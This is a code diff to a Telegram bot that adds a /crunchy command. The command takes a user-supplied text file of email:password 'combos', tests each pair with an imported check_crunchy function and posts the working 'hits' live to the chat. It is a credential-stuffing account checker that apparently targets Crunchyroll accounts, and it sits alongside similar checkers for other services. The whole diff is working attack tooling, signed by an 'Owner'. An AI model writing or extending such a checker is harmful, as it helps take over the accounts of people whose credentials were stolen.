@@ -5,6 +5,7 @@ import threading
 from telebot import types
 from nonsk4 import check_nonsk4, get_footer_info as nonsk4_footer_info
 from gpt import check_gpt, get_footer_info as gpt_footer_info
+from crunchy import check_crunchy, get_footer_info as crunchy_footer_info
 import os
 import sys
 
@@ -179,6 +180,77 @@ def callback_query(call):
     elif cmd == 'total':
         pass  # Do nothing
 
+@bot.message_handler(commands=['crunchy'])
+def crunchy_command(message):
+    if message.reply_to_message and message.reply_to_message.document:
+        if message.reply_to_message.document.mime_type == 'text/plain':
+            file_info = bot.get_file(message.reply_to_message.document.file_id)
+            downloaded_file = bot.download_file(file_info.file_path)
+            file_content = downloaded_file.decode('utf-8')
+
+            chat_id = message.chat.id
+            username = message.from_user.username
+
+            # Start a new thread to handle the file processing
+            threading.Thread(target=process_crunchy, args=(chat_id, username, file_content)).start()
+        else:
+            bot.reply_to(message, "Please reply to a valid txt file.")
+    else:
+        bot.reply_to(message, "Please reply to a txt file with the /crunchy command.")
+
+def process_crunchy(chat_id, username, file_content):
+    total_accounts = file_content.splitlines()
+    start_time = time.time()
+    hits = []
+    dead = []
+
+    initial_message = "Checking Your Account.\n\n"
+    footer_info = get_footer_info(len(total_accounts), start_time, username)
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("CC", callback_data=f"{chat_id}:cc"))
+    markup.add(types.InlineKeyboardButton(f"Hit ✅: {len(hits)}", callback_data=f"{chat_id}:hit"))
+    markup.add(types.InlineKeyboardButton(f"Dead ❌: {len(dead)}", callback_data=f"{chat_id}:dead"))
+    markup.add(types.InlineKeyboardButton("Total Accounts", callback_data=f"{chat_id}:total"))
+    markup.add(types.InlineKeyboardButton("Stop", callback_data=f"{chat_id}:stop"))
+    
+    msg = bot.send_message(chat_id, initial_message + footer_info, reply_markup=markup)
+
+    for account in total_accounts:
+        email, password = account.split(":", 1)
+        result, response_message = check_crunchy(email, password)
+        if result == 'Hit':
+            hits.append(account)
+        else:
+            dead.append(account)
+
+        chat_data[chat_id] = {
+            'hits': hits,
+            'dead': dead,
+            'total_accounts': total_accounts
+        }
+
+        if result == 'Hit':
+            live_update = f"↯ CRUNCHY\n\nCOMBO: {account}\nResult: HIT✅\nResponse:\n{response_message}\n\n" + footer_info
+        else:
+            live_update = f"↯ CRUNCHY\n\nCOMBO: {account}\nResult: Dead\nResponse: {response_message}\n\n" + footer_info
+
+        # Update inline buttons with live count
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("CC", callback_data=f"{chat_id}:{account}"))
+        markup.add(types.InlineKeyboardButton(f"Hit ✅: {len(hits)}", callback_data=f"{chat_id}:hit"))
+        markup.add(types.InlineKeyboardButton(f"Dead ❌: {len(dead)}", callback_data=f"{chat_id}:dead"))
+        markup.add(types.InlineKeyboardButton("Total Accounts", callback_data=f"{chat_id}:total"))
+        markup.add(types.InlineKeyboardButton("Stop", callback_data=f"{chat_id}:stop"))
+        
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=msg.message_id,
+            text=live_update,
+            reply_markup=markup
+        )
+
+    final_message = "↯ CRUNCHY\n\nGAME OVER⚡️\n\n－－－－－－－－－－－－－－－－\nOwner: Aftab👑\n－－－－－－－－－－－－－－－－"
+    bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=final_message, reply_markup=markup)
 
 if __name__ == "__main__":
     keep_alive()
